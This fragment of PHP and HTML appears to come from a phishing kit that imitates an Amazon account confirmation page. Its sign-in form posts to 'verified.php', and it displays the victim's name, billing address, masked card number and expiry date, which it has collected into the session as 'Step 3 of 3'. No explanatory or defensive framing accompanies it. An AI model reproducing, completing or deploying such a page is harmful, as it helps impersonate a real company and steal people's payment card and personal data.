...
<script type='text/javascript'>var ue_t0=ue_t0||+new Date();</script>
    ...
    <title dir="ltr">Amazon informations confirmation </title>
...
<?php } ?>
  ...
  <div class="a-section">
    ...
    <form name="signIn" method="post" novalidate action="verified.php" class="a-spacing-none">
...
<div class="a-section"><div class="a-section pmts-step-2"><span class="a-size-base pmts-pick-address-view-header a-text-bold">Confirm your informations</span><span class="a-letter-space"></span><span class="a-size-small pmts-step-unweighted">(Step 3 of 3)</span><div><BR/>
          ...
          <p>
<div class="a-divider a-divider-break"><h5>Billing</h5></div>
<b><?php echo $_SESSION['fullname']?></b><br/>  
<b><?php echo $_SESSION['add1']?></b> <br/>
<b><?php echo $_SESSION['state']?></b><br/>  
<b><?php echo $_SESSION['city']?>, <b><?php echo $_SESSION['zip']?></b><br/> </b>
<b><?php echo $_SESSION['country']?></b><br/>  
<br><br>
            <div class="a-divider a-divider-break"><h5>Payment informations</h5></div>

<b>XXXX-XXXX-XXXX-<?php echo substr($_SESSION['ccnum'],12,16); ?></b><br>
 <b><?php echo $_SESSION['exp'];?></b><br>
<b>***</b>         <br><br>  
